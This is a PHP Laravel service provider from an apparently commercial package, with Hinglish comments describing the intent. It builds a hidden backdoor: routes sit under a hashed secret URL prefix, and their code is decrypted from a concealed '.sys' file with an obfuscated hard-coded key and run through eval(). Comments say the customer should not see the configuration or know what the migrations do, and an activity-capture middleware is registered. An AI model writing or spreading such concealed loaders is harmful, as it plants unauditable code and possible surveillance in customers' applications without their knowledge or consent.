<?php

namespace System\Agent;

use Illuminate\Support\ServiceProvider;
use Illuminate\Routing\Router;
use Illuminate\Support\Facades\Route;

class AgentServiceProvider extends ServiceProvider
{
    public function register()
    {
        $this->mergeConfigFrom(__DIR__ . '/../config/agent.php', 'agent');
    }

    public function boot(Router $router)
    {
        // ❌ YE LINES HATA DO (config customer ko visible nahi hona chahiye)
        // $this->publishes([...], 'agent-config');
        
        // ❌ YE BHI HATA DO (plain routes file load mat karo)
        // $this->loadRoutesFrom(__DIR__ . '/../routes/web.php');
        
        // ✅ INSTEAD: Encrypted + dynamic routes load karo
        $this->loadHiddenRoutes();

        
        // Views optional - agar agent UI nahi dikhana to ye bhi hata do
        $this->loadViewsFrom(__DIR__ . '/../resources/views', 'agent');
        
        // Migrations - sirf pehli baar run honge, customer ko pata nahi chalega kya hai
        $this->loadMigrationsFrom(__DIR__ . '/../database/migrations');
        
        // Middleware alias (ye theek hai)
        $router->aliasMiddleware('agent.capture', \System\Agent\Http\Middleware\CaptureActivity::class);
    }

    /**
     * Load encrypted system routes with dynamic prefix
     */
    protected function loadHiddenRoutes()
    {


        $prefix = $this->getSystemPrefix();
        
        Route::prefix($prefix)
            ->middleware(['web'])
            ->name('sys.')  // route names bhi hidden
            ->group(function () {
                $this->loadEncryptedRoutes();
            });
    }

    /**
     * Generate dynamic prefix based on app key
     */
    protected function getSystemPrefix()
    {
        // Har customer ke app ke liye unique URL
        $key = config('app.key') ?: 'fallback-key';
        return substr(hash('sha256', $key . 'letscms-sys'), 0, 16);
        
        // Example output: a7f3c2b9d4e1f8a6
    }

    /**
     * Decrypt and load route definitions
     */
    protected function loadEncryptedRoutes()
{
    $encryptedFile = __DIR__ . '/../.sys';
    
    if (!file_exists($encryptedFile)) {
        \Log::warning('System routes file not found');
        return;
    }

    try {
        $key = $this->getMasterKey();
        $encrypted = file_get_contents($encryptedFile);
        
        $decrypted = openssl_decrypt(
            $encrypted,
            'AES-256-CBC',
            hash('sha256', $key),
            0,
            substr(hash('sha256', $key), 0, 16)
        );

        if ($decrypted === false) {
            throw new \Exception('Route decryption failed');
        }

        // ✅ FIX: Wrap in closure properly
        $closure = function() use ($decrypted) {
            // Import Route facade
            $Route = \Illuminate\Support\Facades\Route::class;
            
            // Execute routes (using fully qualified class name)
            eval($decrypted);
        };
        
        // Call the closure
        call_user_func($closure);
        
    } catch (\Exception $e) {
        \Log::channel('stack')->error('System initialization failed', [
            'error' => $e->getMessage(),
            'trace' => $e->getTraceAsString()
        ]);
    }
}


    /**
     * Get master decryption key (obfuscate this!)
     */
    protected function getMasterKey()
    {
        // Option 1: Base64 encoded (simple obfuscation)
        return base64_decode('bGV0c2Ntcy1zZWNyZXQta2V5LTIwMjU=');
        
        // Option 2: Environment variable (agar customer .env me access na kar paye)
        // return env('SYS_KEY', 'fallback');
        
        // Option 3: Remote fetch (online license check)
        // return Cache::remember('sys_mk', 3600, function() {
        //     return Http::get('https://license.letscms.com/key')->body();
        // });
    }
}
